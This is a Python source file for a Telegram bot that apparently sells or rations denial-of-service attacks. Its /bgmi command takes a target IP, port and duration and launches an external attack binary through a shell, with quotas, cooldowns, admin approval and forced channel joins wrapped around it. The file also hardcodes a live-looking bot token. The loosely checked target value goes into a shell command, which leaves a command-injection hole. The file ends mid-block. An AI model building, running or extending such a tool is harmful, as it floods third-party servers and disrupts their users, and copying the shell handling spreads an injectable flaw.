#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import telebot
import subprocess
import threading
import time
from datetime import datetime, timedelta, timezone
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
from telebot import apihelper # Needed for exception handling
import logging # Import standard logging module

# --- Image Feedback Imports ---
import imagehash
from PIL import Image, UnidentifiedImageError # Import UnidentifiedImageError explicitly
import requests
import io
# --- End Image Feedback Imports ---

# --- Configuration ---
# TODO: IMPORTANT! Replace these placeholders with your actual values if needed.
bot_token = '7289510738:AAGrzVSbn7cUnfNLIkmeJwpLwnxyoQ63BPY' # Replace with your bot token
admin_id = '5997383383'  # Replace with your actual admin user ID (as a string)
GROUP_ID = '-1002325396170'  # Allowed group ID where commands work AND group cooldown applies (as a string)

# --- Required Channels ---
# User must be a member of ALL channels in this list to use attack commands
# Use channel usernames (e.g., '@channelname') or public channel IDs (e.g., -1001234567890)
REQUIRED_CHANNELS = ['@tokyo_group12', '@ggbhjc', '@jenjrjjej'] # Example: ['@mychannel1', '-1001234567890']

# --- Attack Settings ---
max_daily_attacks = 10 # Per user
COOLDOWN_TIME = 200 # 240 seconds cooldown per user AND for the group
ATTACK_SCRIPT_PATH = "/bgmi" # Path to your attack script (ensure it's executable: chmod +x night)
MAX_ATTACK_DURATION = 180 # Maximum allowed duration for a single attack in seconds
MIN_ATTACK_DURATION = 1   # Minimum allowed duration

# --- Feedback Settings ---
FEEDBACK_HASH_SIMILARITY_THRESHOLD = 5 # How different must hashes be? Lower = stricter (0 = identical). Adjust as needed.
MAX_STORED_HASHES_PER_USER = 10 # Store the last N hashes per user to check against (Simple FIFO not guaranteed, but trims)

# --- Bot State Variables ---
approved_private_users = set() # Stores user IDs (strings) approved for private chat usage
user_attack_count = {} # Tracks {user_id_str: count} for daily limits
running_attacks = {} # Tracks {user_id_str: {process, target, start_time, ...}} for active attacks
user_last_attack_time = {} # Tracks {user_id_str: timestamp} for PERSONAL cooldowns
group_last_attack_time = 0 # Tracks timestamp of the last attack initiated IN THE GROUP_ID

# --- New Feedback State ---
users_needing_feedback = set() # Set of user_id_str who need to provide image feedback
user_feedback_hashes = {} # Dict: {user_id_str: set(recent_hash_strings)} stores feedback image hashes

# --- Bot Initialization ---
BOT_ID = None # Will be set after successful initialization
try:
    # Configure logging level for telebot using the standard logging module
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    logging.getLogger("requests").setLevel(logging.WARNING)
    logging.getLogger("urllib3").setLevel(logging.WARNING)

    bot = telebot.TeleBot(bot_token, parse_mode=None) # Explicitly disable default parse_mode if using specific modes later
    bot_info = bot.get_me()
    BOT_ID = bot_info.id # Store bot's own ID for checking replies
    logging.info(f"--- Telegram Bot Initializing ---")
    logging.info(f"Bot Username: @{bot_info.username} (ID: {BOT_ID})")
except Exception as e:
    logging.critical(f"FATAL: Could not initialize bot. Error: {e}", exc_info=True)
    print(f"FATAL: Could not initialize bot. Error: {e}") # Keep print for immediate visibility
    print("Please check your bot_token and network connection.")
    exit(1)
# --- End Bot Initialization ---

# --- Helper Functions ---
def reset_attack_count():
    """Resets daily attack counts and feedback states at midnight UTC."""
    global group_last_attack_time
    while True:
        try:
            now = datetime.now(timezone.utc)
            next_reset_dt = (now + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
            time_to_wait = (next_reset_dt - now).total_seconds()

            logging.info(f"[Scheduler] Next daily reset at {next_reset_dt.strftime('%Y-%m-%d %H:%M:%S %Z')}. Waiting {time_to_wait:.2f} seconds.")

            sleep_chunk = 3600 # Sleep for 1 hour max at a time
            while time_to_wait > 0:
                sleep_duration = min(time_to_wait, sleep_chunk)
                time.sleep(sleep_duration)
                time_to_wait -= sleep_duration
                if time_to_wait < sleep_chunk * 1.5:
                     now = datetime.now(timezone.utc)
                     time_to_wait = max(0, (next_reset_dt - now).total_seconds()) # Ensure non-negative

            logging.info(f"[Scheduler] Performing daily reset (UTC Midnight)...")
            user_attack_count.clear()
            users_needing_feedback.clear()
            user_feedback_hashes.clear()
            logging.info("[Scheduler] Daily counts and feedback states successfully reset.")
            time.sleep(2) # Small buffer

        except Exception as e:
            logging.error(f"[Scheduler Error] An error occurred in reset_attack_count: {e}", exc_info=True)
            logging.warning("[Scheduler Error] Retrying reset check in 10 minutes...")
            time.sleep(600)

def get_remaining_attacks(user_id):
    """Calculates remaining daily attacks for a specific user."""
    return max_daily_attacks - user_attack_count.get(str(user_id), 0)

def is_allowed_chat(chat_id, user_id):
    """Checks if the bot should operate for the given user in the given chat."""
    str_chat_id = str(chat_id)
    str_user_id = str(user_id)
    is_admin_user = str_user_id == admin_id

    if is_admin_user: return True
    is_allowed_group = str_chat_id == GROUP_ID
    is_private_chat = str_chat_id == str_user_id
    is_approved_private_user = str_user_id in approved_private_users
    allowed = is_allowed_group or (is_private_chat and is_approved_private_user)
    return allowed

def check_channel_membership(user_id):
    """Checks if the specific user is a member of ALL required channels."""
    user_id_str = str(user_id)
    if not REQUIRED_CHANNELS: return True
    if user_id_str == admin_id: return True # Admin bypasses

    missing_channels = []
    all_ok = True
    for channel in REQUIRED_CHANNELS:
        is_member = False
        try:
            member_info = bot.get_chat_member(chat_id=channel, user_id=user_id) # user_id can be int or str
            allowed_statuses = ['member', 'administrator', 'creator']
            if member_info.status in allowed_statuses:
                is_member = True
            else:
                 logging.warning(f"User {user_id_str} NOT in channel {channel} (Status: {member_info.status})")
                 missing_channels.append(channel)
        except apihelper.ApiException as e:
            err_desc = e.description.lower()
            if "user not found" in err_desc or "chat not found" in err_desc or "bot is not a member" in err_desc or "member list is inaccessible" in err_desc:
                 logging.info(f"API Info: Cannot confirm membership for {user_id_str} in {channel} ({e.description}). Assuming not member.")
            else:
                 logging.error(f"API Error checking membership for user {user_id_str} in {channel}: {e}")
            missing_channels.append(f"{channel} (Check Failed)")
        except Exception as e:
            logging.error(f"Unexpected error checking membership for user {user_id_str} in {channel}: {e}", exc_info=True)
            missing_channels.append(f"{channel} (Check Failed)")

        if not is_member:
            all_ok = False

    if not all_ok:
        logging.warning(f"User {user_id_str} failed channel check. Missing/Failed: {missing_channels}")
        return False
    return True
# --- End Helper Functions ---

# --- Command Handlers ---

@bot.message_handler(commands=['start'])
def start_command(message):
    """Handles the /start command, differentiating between private and group chats."""
    chat_id = str(message.chat.id)
    sender_user_id = str(message.from_user.id)
    user_info = message.from_user
    username = user_info.username if user_info.username else "N/A"
    safe_first_name = f"`{user_info.first_name}`" if user_info.first_name else "`User`"

    logging.info(f"Received /start from User ID: {sender_user_id} (Name: {user_info.first_name}, @{username}) in Chat ID: {chat_id} (Type: {message.chat.type})")

    if message.chat.type == 'private':
        if sender_user_id == admin_id or sender_user_id in approved_private_users:
            welcome_message = (
                f"👋 W͢e͢l͢c͢o͢m͢e͢ b͢a͢c͢k͢ 👋 {safe_first_name}! (Private Access)\n\n"
                f"𝙔𝙤𝙪 𝘼𝙧𝙚 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘽𝙮 𝘼𝘿𝙈𝙄𝙉\n"
                f"Use /help to see available commands."
            )
            if REQUIRED_CHANNELS:
                 if check_channel_membership(sender_user_id):
                      welcome_message += "\n\n✅ You are also a member of the required channels."
                 else:
                      channel_links = "\n".join([f"➡️ [{ch.replace('@', '')}](https://t.me/{ch.replace('@', '')})" for ch in REQUIRED_CHANNELS])
                      welcome_message += (
                          f"\n\n⚠️𝘼𝙘𝙩𝙞𝙤𝙣 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙 𝙛𝙤𝙧 `/bgmi`\n"
                          f"You must join the following channel(s) to use attack commands:\n{channel_links}"
                      )
            try:
                bot.reply_to(message, welcome_message, parse_mode='Markdown', disable_web_page_preview=True)
            except Exception as e:
                logging.error(f"Error sending welcome message to approved user {sender_user_id}: {e}")

        else:
            markup = InlineKeyboardMarkup()
            request_button = InlineKeyboardButton("💌 Request Private Access", callback_data=f"request_access_{sender_user_id}")
            markup.add(request_button)
            request_text = (
                "🧿🚫𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝🚫🧿\n\n"
                "𝐘𝐎𝐔 𝐃𝐎𝐍'𝐓 𝐇𝐀𝐕𝐄 𝐀𝐃𝐌𝐈𝙉 𝐩𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧\n"
                "ᴄʟɪᴄᴋ ʀᴇQᴜᴇꜱᴛ ʙᴜᴛᴛᴏɴ ᴛᴏ ɢᴇᴛ\n"
                "💳ᴘᴇʀᴍɪꜱꜱɪᴏɴ ꜰᴏʀ ᴘᴇʀꜱᴏɴᴀʟ ᴜꜱᴇ🎁"
            )
            try:
                bot.send_message(chat_id, request_text, reply_markup=markup, parse_mode='Markdown')
            except Exception as e:
                 logging.error(f"Error sending access request prompt to user {sender_user_id}: {e}")

    else: # Group or other chat type
        group_welcome = (
             f"👋 𝙃𝙚𝙡𝙡𝙤 {safe_first_name}! \n"
             f"𝚃𝚑𝚒𝚜 𝚋𝚘𝚝 𝚠𝚘𝚛𝚔𝚜 𝚑𝚎𝚛𝚎 in @{message.chat.username or message.chat.title} (`{chat_id}`).\n"
             f"Use /help to see commands.\n\n"
             f"(To request private usage, send /start directly to me @{bot.get_me().username} in a private message.)"
        )
        try:
            bot.reply_to(message, group_welcome, parse_mode='Markdown')
        except Exception as e:
            logging.error(f"Error sending group welcome message in chat {chat_id}: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('request_access_'))
def handle_request_access(call):
    """Handles the 'Request Private Access' button callback."""
    user_id_to_request = None
    try:
        user_id_to_request = call.data.split('_')[2]
        requesting_user_info = call.from_user

        if str(requesting_user_info.id) != user_id_to_request:
            bot.answer_callback_query(call.id, "⚠️ Error: Mismatched request ID.", show_alert=True)
            logging.warning(f"[Security Alert] Mismatched access request: Button for {user_id_to_request} clicked by {requesting_user_info.id}")
            return

        if call.message.chat.type != 'private' or str(call.message.chat.id) != user_id_to_request:
            bot.answer_callback_query(call.id, "⚠️ Please request access using /start in a private chat.", show_alert=True)
            logging.warning(f"[Security Alert] Access request callback from non-private chat or wrong chat ID. Expected: {user_id_to_request}, Got: {call.message.chat.id} (Type: {call.message.chat.type})")
            return

        logging.info(f"Private access request received for User ID: {user_id_to_request} (Name: {requesting_user_info.first_name}, @{requesting_user_info.username})")

        safe_first_name = f"`{requesting_user_info.first_name}`" if requesting_user_info.first_name else "`User`"
        username = requesting_user_info.username if requesting_user_info.username else "No username"

        if user_id_to_request in approved_private_users:
            bot.answer_callback_query(call.id, "✅ You are already approved.", show_alert=False)
            try:
                bot.edit_message_text(
                    "✅ **Already Approved!** ✅\nYou already have private access.",
                    chat_id=call.message.chat.id, message_id=call.message.message_id,
                    reply_markup=None, parse_mode='Markdown'
                )
            except apihelper.ApiException as edit_err:
                 if "message is not modified" not in str(edit_err).lower():
                     logging.warning(f"Failed to edit 'Already Approved' message for {user_id_to_request}: {edit_err}")
            return

        admin_message = (
            f"💳 𝙽𝙴𝚆 𝚁𝙴𝚀𝚄𝙴𝚂𝚃 𝙵𝙾𝚁 𝙿𝚁𝙸𝚅𝙰𝚃𝙴 💳\n\n"
            f"🔴𝙽𝙰𝙼𝙴 --> {safe_first_name}\n"
            f"🔵𝚃𝙶 𝙸𝙳 --> `{user_id_to_request}`\n"
            f"⚪𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 --> @{username}\n\n"
            f"👇 Approve using:\n`/approve_in_private {user_id_to_request}`"
        )
        try:
            bot.send_message(str(admin_id), admin_message, parse_mode='Markdown')
        except Exception as admin_err:
             logging.error(f"Failed to send access request notification to admin {admin_id}: {admin_err}")
             bot.answer_callback_query(call.id, "❌ Error sending request to admin.", show_alert=True)
             return

        bot.answer_callback_query(call.id, "⛎ Request sent successfully. Please wait for admin approval. ⛎", show_alert=False)
        try:
            bot.edit_message_text(
                "⛎ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ⛎\n\n"
                "Your request for private access has been forwarded to the admin.\n"
                "You will be notified of the admin's decision.",
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                reply_markup=None, parse_mode='Markdown'
            )
        except apihelper.ApiException as edit_err:
             if "message is not modified" not in str(edit_err).lower():
                 logging.warning(f"Failed to edit 'Request Sent' message for {user_id_to_request}: {edit_err}")

    except IndexError:
        logging.error(f"Error parsing callback data for request access: {call.data}")
        bot.answer_callback_query(call.id, "❌ Error: Invalid request data.", show_alert=True)
    except Exception as e:
        error_user_id = user_id_to_request if user_id_to_request else call.from_user.id
        logging.error(f"Unexpected error handling request access for user {error_user_id}: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "❌ An unexpected error occurred.", show_alert=True)
        try:
            bot.send_message(str(admin_id), f"⚠️ Unexpected error processing access request from user `{error_user_id}`. Check logs.", parse_mode='Markdown')
        except Exception: pass

@bot.message_handler(commands=['approve_in_private'])
def approve_in_private(message):
    """Admin command: Approves a user for private chat usage."""
    sender_user_id = str(message.from_user.id)
    if sender_user_id != admin_id:
        bot.reply_to(message, "🚫 Access Denied: Admin only.")
        return

    command_parts = message.text.split()
    if len(command_parts) != 2 or not command_parts[1].isdigit():
        bot.reply_to(message, "⚠️ Invalid Format.\nUsage: `/approve_in_private <user_id>`")
        return

    target_user_id = command_parts[1]
    if target_user_id == admin_id:
        bot.reply_to(message, "ℹ️ Admin inherently has access.")
        return
    if target_user_id in approved_private_users:
        bot.reply_to(message, f"ℹ️ User `{target_user_id}` is already approved.", parse_mode='Markdown')
        return

    approved_private_users.add(target_user_id)
    logging.info(f"[Admin Action] Approved User ID: {target_user_id} for private chat access.")

    target_first_name = "`User`" # Default wrapped
    try:
        target_user_info = bot.get_chat(target_user_id)
        target_first_name = f"`{target_user_info.first_name}`" if target_user_info.first_name else "`User`"
    except Exception as e:
         logging.warning(f"Could not fetch target user info for {target_user_id}: {e}")

    approval_message = (
        f"🎉𝘾𝙤𝙣𝙜𝙧𝙖𝙩𝙪𝙡𝙖𝙩𝙞𝙤𝙣𝙨🎉\n\nᗪᗴᗩᖇ --> {target_first_name}\n\n"
        "You have been approved by the admin and can now use the bot's commands in this private chat.\n\n"
        "Use /help to see commands."
    )
    if REQUIRED_CHANNELS:
        approval_message += "\n\n*Remember, you might still need to join required channels (see /help) to use `/bgmi`.*"

    try:
        bot.send_message(str(target_user_id), approval_message, parse_mode='Markdown')
        bot.reply_to(message, f"✅ User `{target_user_id}` approved and notified.", parse_mode='Markdown')
    except apihelper.ApiException as e:
        logging.error(f"API Error sending approval notification to {target_user_id}: {e}")
        bot.reply_to(message, f"✅ User `{target_user_id}` approved, **but failed to notify them** (Reason: {e.description}). They might have blocked the bot.", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Unexpected error during approval notification for {target_user_id}: {e}", exc_info=True)
        bot.reply_to(message, f"✅ User `{target_user_id}` approved, **but an unexpected error occurred during notification**. Check logs.", parse_mode='Markdown')

@bot.message_handler(commands=['remove_in_private_chat'])
def remove_in_private_chat(message):
    """Admin command: Removes a user from private chat access."""
    sender_user_id = str(message.from_user.id)
    if sender_user_id != admin_id:
        bot.reply_to(message, "🚫 Access Denied: Admin only.")
        return

    command_parts = message.text.split()
    if len(command_parts) != 2 or not command_parts[1].isdigit():
        bot.reply_to(message, "⚠️ Invalid Format.\nUsage: `/remove_in_private_chat <user_id>`")
        return

    target_user_id = command_parts[1]
    if target_user_id not in approved_private_users:
        bot.reply_to(message, f"ℹ️ User `{target_user_id}` is not currently approved.", parse_mode='Markdown')
        return

    approved_private_users.discard(target_user_id)
    logging.info(f"[Admin Action] Removed User ID: {target_user_id} from private chat access.")

    try:
        removal_message = "Your private access to this bot has been revoked by the admin."
        bot.send_message(str(target_user_id), removal_message) # No markdown needed
        bot.reply_to(message, f"✅ User `{target_user_id}` removed from private access and notified.", parse_mode='Markdown')
    except apihelper.ApiException as e:
        logging.error(f"API Error sending removal notification to {target_user_id}: {e}")
        bot.reply_to(message, f"✅ User `{target_user_id}` removed, **but failed to notify them** (Reason: {e.description}).", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Unexpected error during removal notification for {target_user_id}: {e}", exc_info=True)
        bot.reply_to(message, f"✅ User `{target_user_id}` removed, **but an unexpected error occurred during notification**. Check logs.", parse_mode='Markdown')

@bot.message_handler(commands=['check'])
def check_limit(message):
    """Checks the sender's remaining daily attacks, feedback status, and cooldowns."""
    chat_id = str(message.chat.id)
    sender_user_id = str(message.from_user.id)
    user_info = message.from_user
    safe_first_name = f"`{user_info.first_name}`" if user_info.first_name else "`User`"

    if not is_allowed_chat(chat_id, sender_user_id):
        if message.chat.type != 'private': return

    remaining = get_remaining_attacks(sender_user_id)

    feedback_status = "✅ Not Required"
    if sender_user_id != admin_id and sender_user_id in users_needing_feedback:
        feedback_status = "⚠️ **Feedback Required!** (Send image)"

    personal_cooldown_status = "✅ Ready"
    current_time = time.time()
    last_attack_time = user_last_attack_time.get(sender_user_id, 0)
    personal_cooldown_remaining = COOLDOWN_TIME - (current_time - last_attack_time)
    if sender_user_id != admin_id and personal_cooldown_remaining > 0:
         personal_cooldown_status = f"⏳ Personal Cooldown ({int(personal_cooldown_remaining)}s left)"

    group_cooldown_status = "⚪ N/A"
    group_cooldown_remaining = 0
    is_in_target_group = chat_id == GROUP_ID
    if is_in_target_group and sender_user_id != admin_id:
        group_cooldown_remaining = COOLDOWN_TIME - (current_time - group_last_attack_time)
        if group_cooldown_remaining > 0:
            group_cooldown_status = f"⏳ Group Cooldown ({int(group_cooldown_remaining)}s left)"
        else:
             group_cooldown_status = "✅ Group Ready"
    elif not is_in_target_group:
        group_cooldown_status = "⚪ N/A (Not in Group)"
    elif sender_user_id == admin_id:
         group_cooldown_status = "⚪ N/A (Admin)"

    status_text = (
        f"📊 **Your Status, {safe_first_name}** (`{sender_user_id}`)\n\n"
        f"Attacks Left Today: {remaining} / {max_daily_attacks}\n"
        f"Your Cooldown: {personal_cooldown_status}\n"
        f"Group Cooldown: {group_cooldown_status}\n"
        f"Feedback Status: {feedback_status}"
    )
    try:
        bot.reply_to(message, status_text, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error sending /check status to user {sender_user_id} in chat {chat_id}: {e}")

@bot.message_handler(commands=['id'])
def show_user_id(message):
    """Shows the sender their Telegram ID and the current chat ID."""
    sender_user_id = message.from_user.id
    chat_id = message.chat.id
    id_text = f"👤 Your User ID: `{sender_user_id}`\n💬 Current Chat ID: `{chat_id}`"
    try:
        bot.reply_to(message, id_text, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error sending /id to user {sender_user_id} in chat {chat_id}: {e}")


# ============================================================
# --- BGMI ATTACK COMMAND - INCLUDES GROUP COOLDOWN ---
# ============================================================
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    global group_last_attack_time

    chat_id = str(message.chat.id)
    sender_user_id = str(message.from_user.id)
    user_info = message.from_user
    username = user_info.username if user_info.username else "N/A"
    safe_first_name = f"`{user_info.first_name}`" if user_info.first_name else "`User`"
    is_admin = sender_user_id == admin_id

    logging.info(f"Received /bgmi from User ID: {sender_user_id} (Name: {user_info.first_name}, Admin: {is_admin}) in Chat ID: {chat_id}")

    # 1. Allowed Chat Check
    if not is_allowed_chat(chat_id, sender_user_id):
        logging.warning(f"Attack command rejected: User {sender_user_id} used in non-allowed chat {chat_id}")
        if message.chat.type == 'private' and sender_user_id not in approved_private_users:
             try: bot.reply_to(message, "🚫 You need admin approval to use commands in private chat. Use /start to request access.")
             except Exception: pass
        return

    # 2. Feedback Check
    if not is_admin and sender_user_id in users_needing_feedback:
        logging.warning(f"Attack command rejected: User {sender_user_id} needs feedback.")
        feedback_msg = (
            f"⚠️𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝♻️\n"
            f"ᗪᗴᗩᖇ --> {safe_first_name},\n\n"
            f"𝐒𝐞𝐧𝐝 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐁𝐞𝐟𝐨𝐫𝐞 𝐑𝐮𝐧𝐧𝐢𝐧𝐠🏃💨𝐘𝐨𝐮𝐫 𝐍𝐞𝐰 𝐀𝐭𝐭𝐚𝐜𝐤 \n⚠️𝐍𝐨𝐭𝐢𝐜𝐞 𝐁𝐲 𝐓𝐞𝐚𝐦-𝐒𝟒"
        )
        try: bot.reply_to(message, feedback_msg, parse_mode='Markdown')
        except Exception: pass
        return

    # 3. Channel Membership Check
    if not is_admin and not check_channel_membership(sender_user_id):
        logging.warning(f"Attack command rejected: User {sender_user_id} not in required channels.")
        channel_links = "\n".join([f"➡️ [{ch.replace('@', '')}](https://t.me/{ch.replace('@', '')})" for ch in REQUIRED_CHANNELS])
        membership_msg = (
            f"⚠️Channel Membership Required⚠️\n\n"
            f"To use `/bgmi`, {safe_first_name}, please join:\n{channel_links}\n\n"
            f"Once joined, try the command again."
        )
        try: bot.reply_to(message, membership_msg, parse_mode='Markdown', disable_web_page_preview=True)
        except Exception: pass
        return

    # 4. Daily Limit Check
    if not is_admin:
        remaining_attacks = get_remaining_attacks(sender_user_id)
        if remaining_attacks <= 0:
            logging.warning(f"Attack command rejected: User {sender_user_id} reached daily limit.")
            limit_msg = f"🚫 **Daily Limit Reached** 🚫\n\n{safe_first_name} (`{sender_user_id}`), you have used all {max_daily_attacks} attacks for today. Please wait until the daily reset (midnight UTC)."
            try: bot.reply_to(message, limit_msg, parse_mode='Markdown')
            except Exception: pass
            return

    # --- Cooldown Checks ---
    current_time = time.time()

    # 5. Personal Cooldown Check
    if not is_admin:
        last_attack_time = user_last_attack_time.get(sender_user_id, 0)
        personal_cooldown_remaining = COOLDOWN_TIME - (current_time - last_attack_time)
        if personal_cooldown_remaining > 0:
            logging.warning(f"Attack rejected: User {sender_user_id} PERSONAL cooldown ({personal_cooldown_remaining:.0f}s left).")
            cooldown_msg = f"⏰ **Cooldown Active** ⏰\n\n{safe_first_name} (`{sender_user_id}`), please wait **{int(personal_cooldown_remaining)}** more seconds before your next attack."
            try: bot.reply_to(message, cooldown_msg, parse_mode='Markdown')
            except Exception: pass
            return

    # 5.5. Group Cooldown Check
    is_in_target_group = chat_id == GROUP_ID
    if is_in_target_group and not is_admin:
        group_cooldown_remaining = COOLDOWN_TIME - (current_time - group_last_attack_time)
        if group_cooldown_remaining > 0:
            logging.warning(f"Attack rejected: GROUP {GROUP_ID} cooldown ({group_cooldown_remaining:.0f}s left). User: {sender_user_id}")
            group_cooldown_msg = (
                f"⏳ **Group Cooldown Active** ⏳\n\n"
                f"An attack was recently started in this group. Please wait **{int(group_cooldown_remaining)}** seconds.\n\n"
                f"(This cooldown applies to everyone in the group except the admin)."
            )
            try: bot.reply_to(message, group_cooldown_msg, parse_mode='Markdown')
            except Exception: pass
            return

    # 6. Parse Command Arguments
    command_parts = message.text.split()
    # Check for exactly 4 parts: /bgmi target port time
    if len(command_parts) != 4:
        logging.warning(f"Attack rejected: User {sender_user_id} incorrect args count ({len(command_parts)-1} != 3). Args: {command_parts}")
        usage_msg = (
              "⚠️⚠️𝐏𝐋𝐄𝐀𝐒𝐄 - 𝐔𝐒𝐄⚠️⚠️\n\n"
            "𝐞𝐱. - /𝐛𝐠𝐦𝐢 <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞>\n"
            f"𝐞𝐱. - 𝟓𝟒.𝟖𝟖.𝟗𝟐.𝟗 𝟓𝟕𝟒𝟖𝟑 𝟏𝟖𝟎\n"
            f"𝐋𝐚𝐬𝐭 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧 --> {MIN_ATTACK_DURATION} - {MAX_ATTACK_DURATION}s\n\n"
            f"Ｔｅａｍ－Ｓ４ ｏffiｃｉａｌ"
        )
        try: bot.reply_to(message, usage_msg, parse_mode='Markdown')
        except Exception: pass
        return

    target, port_str, attack_time_str = command_parts[1], command_parts[2], command_parts[3]

    # 7. Validate Inputs
    try:
        if not target or len(target) < 3 or target.startswith('-') or ' ' in target:
             raise ValueError("Target address appears invalid.")
        if not port_str.isdigit(): raise ValueError("Port must be a number.")
        port = int(port_str)
        if not (1 <= port <= 65535): raise ValueError("Port must be between 1 and 65535.")
        if not attack_time_str.isdigit(): raise ValueError("Attack duration (time) must be a number.")
        attack_time = int(attack_time_str)
        if not (MIN_ATTACK_DURATION <= attack_time <= MAX_ATTACK_DURATION):
             raise ValueError(f"Duration must be between {MIN_ATTACK_DURATION} and {MAX_ATTACK_DURATION}s.")

    except ValueError as e:
        logging.warning(f"Attack rejected: User {sender_user_id} invalid input - {e}")
        invalid_input_msg = f"⚠️ **Invalid Input** ⚠️\n{e}\nPlease check your target, port, and time values."
        try: bot.reply_to(message, invalid_input_msg, parse_mode='Markdown') # Specify parse_mode
        except Exception: pass
        return

    # 8. Concurrent Attack Check
    if sender_user_id in running_attacks:
        existing_target = running_attacks[sender_user_id].get('target', 'previous target')
        logging.warning(f"Attack rejected: User {sender_user_id} already has attack running on {existing_target}.")
        concurrent_msg = f"⏳ **Attack Already Running** ⏳\n{safe_first_name} (`{sender_user_id}`), your attack on `{existing_target}` is still in progress. Please wait for it to finish."
        try: bot.reply_to(message, concurrent_msg, parse_mode='Markdown')
        except Exception: pass
        return

    # --- All Checks Passed - Proceed ---
    attacks_left_after = get_remaining_attacks(sender_user_id)
    if not is_admin:
        user_last_attack_time[sender_user_id] = current_time
        user_attack_count[sender_user_id] = user_attack_count.get(sender_user_id, 0) + 1
        attacks_left_after = get_remaining_attacks(sender_user_id)

    logging.info(f"Initiating attack: User={sender_user_id}, Target={target}:{port}, Time={attack_time}s. Attacks Left: {attacks_left_after if not is_admin else 'Unlimited'}")

    full_command = f"{ATTACK_SCRIPT_PATH} {str(target)} {str(port)} {str(attack_time)} 677"

    process = None
    try:
        process = subprocess.Popen(
            full_command,
            shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            encoding='utf-8', errors='ignore'
        )
        logging.info(f"Attack process started for user {sender_user_id}. PID: {process.pid}. Command: '{full_command}'")

        if is_in_target_group and not is_admin:
            group_last_attack_time = current_time
            logging.info(f"GROUP cooldown timer updated for {GROUP_ID} (triggered by {sender_user_id}).")

        running_attacks[sender_user_id] = {
            'process': process, 'pid': process.pid, 'target': f"{target}:{port}",
            'start_time': time.time(), 'expected_duration': attack_time,
            'original_chat_id': chat_id, 'original_message_id': message.message_id,
            'user_first_name': user_info.first_name, # Store original name
            'user_username': username
        }

        monitor_thread = threading.Thread(target=monitor_attack, args=(sender_user_id,), daemon=True)
        monitor_thread.start()

        # --- Attack Start Notifications (NEW STYLE - FIXED) ---
        # Admin Notification
        markup_admin = InlineKeyboardMarkup()
        stop_button = InlineKeyboardButton("⏹️ Stop Attack", callback_data=f"stop_attack_{sender_user_id}")
        markup_admin.add(stop_button)
        admin_notification_lines = [
            f"🚨 *New Attack Initiated* 🚨",
            f"┣👤 **User:** {safe_first_name} (`{sender_user_id}`)",
            f"┣💬 **Origin:** `{message.chat.title or 'Private Chat'}` (`{chat_id}`)", # Wrap chat title
            f"┣🎯 **Target:** `{target}:{port}`",
            f"┣⏱️ **Time:** `{attack_time}`s",
            f"┗⚙️ **PID:** `{process.pid}`"
        ]
        if not is_admin:
             admin_notification_lines.append(f"\n📊 User Attacks: {attacks_left_after}/{max_daily_attacks}")
             if is_in_target_group:
                 admin_notification_lines.append(f"⏳ Group `{GROUP_ID}` Cooldown: ON")
        else:
             admin_notification_lines.append(f"\n🔑 **Initiator:** Admin")
        admin_notification = "\n".join(admin_notification_lines)

        try:
            bot.send_message(str(admin_id), admin_notification, reply_markup=markup_admin, parse_mode='Markdown')
        except Exception as e:
            logging.error(f"Error sending attack start notification to admin ({admin_id}): {e}")

        # User Notification
        user_notification_lines = [
            f"꧁•⊹٭𝙰𝚝𝚝𝚊𝚌𝚔 𝚂𝚝𝚊𝚛𝚝𝚎𝚍٭⊹•꧂\n",
            f" ➤𝕯𝖊𝖆𝖗 --> {safe_first_name}\n",
            f" 🧬𝐓𝐚𝐫𝐠𝐞𝐭 --> `{target}`",
            f" 🧬𝐏𝐨𝐫𝐭 --> `{port}`",
            f" 🧬𝐓𝐢𝐦𝐞 --> `{attack_time}`s",
        ]
        if not is_admin:
            user_notification_lines.append(f" ➤𝚁𝚎𝚖𝚊𝚒𝚗𝚒𝚗𝚐 - {attacks_left_after}")
            if is_in_target_group:
                 user_notification_lines.append(f" ➤ 𝙲𝚘𝚘𝚕𝚍𝚘𝚠𝚗 --> ({COOLDOWN_TIME}s)")
        else:
             user_notification_lines.append(f" ➤ **Mode:** Admin (Bypassed Limits)")

        # FIX: Wrap the @ mention in backticks
        user_notification_lines.append(f"\nＴｅａｍ－Ｓ４ officiａｌ")
        user_notification = "\n".join(user_notification_lines)

        try:
            bot.reply_to(message, user_notification, parse_mode='Markdown')
        except apihelper.ApiException as e:
             logging.error(f"API Error sending attack start confirmation to user {sender_user_id} in chat {chat_id}: ({e.error_code}) {e.description}")
        except Exception as e:
             logging.error(f"Unexpected Error sending attack start confirmation to user {sender_user_id} in chat {chat_id}: {e}", exc_info=True)


    except FileNotFoundError:
        error_msg = f"❌ **Execution Error:** Attack script not found at `{ATTACK_SCRIPT_PATH}`. Contact admin."
        logging.error(f"Attack script not found for user {sender_user_id}. Path: '{ATTACK_SCRIPT_PATH}'")
        try: bot.reply_to(message, error_msg, parse_mode='Markdown')
        except Exception: pass
        if not is_admin:
